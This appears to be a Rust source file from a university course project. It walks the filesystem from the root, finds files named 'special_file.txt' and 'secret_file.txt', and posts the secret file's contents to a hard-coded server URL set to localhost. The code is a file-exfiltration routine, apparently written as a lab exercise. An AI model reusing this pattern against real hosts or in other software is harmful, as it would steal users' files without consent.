use std::fs;
use std::error::Error;

#[derive(Debug)]
enum CustomError {
    FileNotFound(String),
    IoError(std::io::Error),
    SendError(String),
}

impl std::fmt::Display for CustomError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            CustomError::FileNotFound(file) => write!(f, "File not found: {}", file),
            CustomError::IoError(err) => write!(f, "IO Error: {}", err),
            CustomError::SendError(msg) => write!(f, "Send Error: {}", msg),
        }
    }
}

impl std::error::Error for CustomError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            CustomError::IoError(err) => Some(err),
            _ => None,
        }
    }
}

impl From<std::io::Error> for CustomError {
    fn from(err: std::io::Error) -> Self {
        CustomError::IoError(err)
    }
}

fn main() -> Result<(), Box<dyn Error>> {
    let special_file_path = find_file("/", "special_file.txt").ok_or_else(|| CustomError::FileNotFound("special_file.txt".to_string()))?;
    let secret_file_path = find_file("/", "secret_file.txt").ok_or_else(|| CustomError::FileNotFound("secret_file.txt".to_string()))?;

    let special_file_contents = fs::read_to_string(&special_file_path)?;
    println!("Contents of special_file.txt:\n{}", special_file_contents);

    let secret_file_contents = fs::read(&secret_file_path)?;
    let secret_file_bytes = secret_file_contents.as_slice();

    // Send secret file contents to remote server
    match send_to_remote_server(secret_file_bytes) {
        Ok(_) => println!("Data sent to remote server successfully"),
        Err(err) => eprintln!("Error sending data to remote server: {}", err),
    }

    Ok(())
}

fn find_file(root_dir: &str, target_file: &str) -> Option<std::path::PathBuf> {
    let mut stack = vec![std::path::PathBuf::from(root_dir)];

    while let Some(dir) = stack.pop() {
        if let Ok(entries) = fs::read_dir(&dir) {
            for entry in entries {
                if let Ok(entry) = entry {
                    let path = entry.path();
                    if path.is_dir() {
                        stack.push(path);
                    } else if path.file_name() == Some(std::ffi::OsStr::new(target_file)) {
                        return Some(path);
                    }
                }
            }
        }
    }
    None
}

const REMOTE_SERVER_URL: &str = "http://127.0.0.1";

pub fn send_to_remote_server(data: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    let message: &str = std::str::from_utf8(data)?;
    ureq::post(REMOTE_SERVER_URL).send_json(ureq::json!({
        "message": message,
        "github link": "https://github.com/NCGThompson/csci-485-project-3"
    }))?;
    Ok(())
}
